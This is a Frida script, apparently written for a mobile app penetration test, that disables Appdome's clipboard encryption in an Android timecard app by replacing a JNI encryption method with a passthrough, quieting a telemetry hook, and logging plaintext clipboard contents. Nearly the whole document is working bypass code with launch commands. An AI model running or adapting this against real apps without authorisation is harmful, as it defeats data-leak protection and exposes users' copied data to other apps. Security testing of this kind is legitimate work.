/*
 * bypass_a2_clipboard_v3.js — A2: Defeat Appdome's clipboard encryption
 *
 * MECHANISM (from RE of classes3.dex):
 *   Appdome swaps ClipboardManager's IClipboard binder field (mService) with a
 *   java.lang.reflect.Proxy whose InvocationHandler routes:
 *     setPrimaryClip(ClipData) → encrypt(plaintext) via NativeBridge.handleClipboard
 *     getPrimaryClip()         → decrypt(ciphertext) via NativeBridge.handleClipboard
 *   Encryption itself is the JNI method:
 *     runtime.loading.NativeBridge.handleClipboard(byte[] data, int len, boolean enc)
 *   implemented in libcore_engine.so.
 *
 * BYPASS:
 *   Replace the Java side of NativeBridge.handleClipboard with a passthrough.
 *   Frida intercepts at the JNI boundary, so the native code never runs.
 *   Effect:
 *     COPY    → setPrimaryClip writes PLAINTEXT to the system clipboard
 *               (external apps see the real text)
 *     PASTE   → getPrimaryClip returns whatever is on the system clipboard
 *               unchanged (works for both internal and external content)
 *
 * Optional secondary hooks neutralise the menu-click telemetry and the
 * ActionCallbackProtection wrapper for completeness.
 *
 * Usage:
 *   adb shell am force-stop com.hartman.timecard
 *   adb shell am start -n com.hartman.timecard/.MainCheckInActivity
 *   frida -U -n Gadget -l scripts/bypass_a2_clipboard_v3.js
 *
 *   Then: type plaintext into the יום ראשון field → Select All → Copy →
 *         paste in Samsung Notes / WhatsApp. The plaintext appears.
 */

Java.perform(function () {

    var Str = Java.use("java.lang.String");
    function asString(bytes) {
        try { return Str.$new(bytes); } catch (e) { return "(non-UTF8)"; }
    }

    // ── PRIMARY BYPASS: neutralise the encryption call ────────────────────────
    try {
        var NB = Java.use("runtime.loading.NativeBridge");
        NB.handleClipboard.implementation = function (bytes, len, encrypt) {
            console.log("[BYPASS] handleClipboard " +
                        (encrypt ? "ENCRYPT" : "DECRYPT") +
                        " len=" + len + " in=\"" + asString(bytes) + "\"" +
                        "  → returning input unchanged");
            return bytes;  // identity transform — no encryption performed
        };
        console.log("[+] NativeBridge.handleClipboard neutralised — encryption disabled");
    } catch (e) { console.log("[-] handleClipboard neutralisation failed: " + e); }

    // ── SECONDARY: silence the per-action telemetry (sendDevEvent) ────────────
    // ActionCallbackProtection.onActionItemClicked sends an event on every
    // Cut/Copy/Paste. We let the action through but log it locally instead.
    try {
        var ACP = Java.use("runtime.clipboard.ActionCallbackProtection");
        ACP.onActionItemClicked.implementation = function (mode, item) {
            console.log("[MENU] " + (item.getTitle() || "(no title)") +
                        " (id=" + item.getItemId() + ")");
            return this.onActionItemClicked(mode, item);
        };
        console.log("[+] ActionCallbackProtection.onActionItemClicked logging");
    } catch (e) { console.log("[-] ActionCallbackProtection: " + e); }

    // ── SECONDARY: log the proxy entry — proves the binder is hijacked ────────
    try {
        var H = Java.use("runtime.clipboard.Clipboard$ClipboardInvocationHandler");
        H.invoke.implementation = function (proxy, method, args) {
            console.log("[PROXY] " + method.getName());
            return this.invoke(proxy, method, args);
        };
        console.log("[+] Clipboard$ClipboardInvocationHandler.invoke logging");
    } catch (e) { console.log("[-] InvocationHandler: " + e); }

    // ── EVIDENCE: top-level ClipboardManager — show plaintext crossing the API ─
    try {
        var CM = Java.use("android.content.ClipboardManager");
        CM.setPrimaryClip.implementation = function (clip) {
            var t = "(empty)";
            try { t = clip.getItemAt(0).getText().toString(); } catch (e) {}
            console.log("[OUT] copy: \"" + t + "\"  (this text now reaches system clipboard in plaintext)");
            return this.setPrimaryClip(clip);
        };
        CM.getPrimaryClip.implementation = function () {
            var clip = this.getPrimaryClip();
            var t = "(null)";
            try { t = clip.getItemAt(0).getText().toString(); } catch (e) {}
            console.log("[IN]  paste: \"" + t + "\"");
            return clip;
        };
        console.log("[+] ClipboardManager evidence hooks installed");
    } catch (e) { console.log("[-] ClipboardManager: " + e); }

    console.log("\n[*] === A2 Bypass v3 active ===");
    console.log("[*] Encryption disabled at the JNI layer.");
    console.log("[*] Copy text from יום ראשון → paste in any external app → plaintext appears.\n");
});
